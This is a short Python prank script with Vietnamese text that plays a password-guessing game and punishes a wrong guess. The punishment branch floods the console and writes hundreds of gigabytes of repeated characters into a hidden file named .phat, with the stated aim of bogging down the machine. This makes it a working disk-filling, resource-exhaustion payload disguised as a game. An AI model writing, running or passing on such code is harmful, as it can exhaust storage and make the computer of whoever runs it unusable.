print("tro choi mat khau ma ay hay tim (matkhau.txt).neu mat khau sai thi se co trung phat")
from random import randrange
from colorama import Fore, Back, Style
import time
matma = randrange(00000000,99999999)
matkhauso = open("matkhau.txt","w",encoding="utf-8")
matkhauso.write(str(matma))
matkhauso.close()
matkhau=input("hay nhap mat khau: ")
if matkhau == str(matma):
	print(Back.GREEN+"mat khau da dung ban vuoc qua tro choi sinh tu")
	time.sleep(9)
	print(Style.RESET_ALL)
	exit()
else:
	print(Back.RED+"ban da trung phat")
	print("vi mat khau da sai trung phat chinh la nang may")
	time.sleep(9)
	phat = open(".phat","w",encoding="utf-8")
	a = 0
	while a < 999:
		print("ha"*9999)
		phat.write("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" * 999999)
		a = a+1
		
	print(Style.RESET_ALL)
	exit()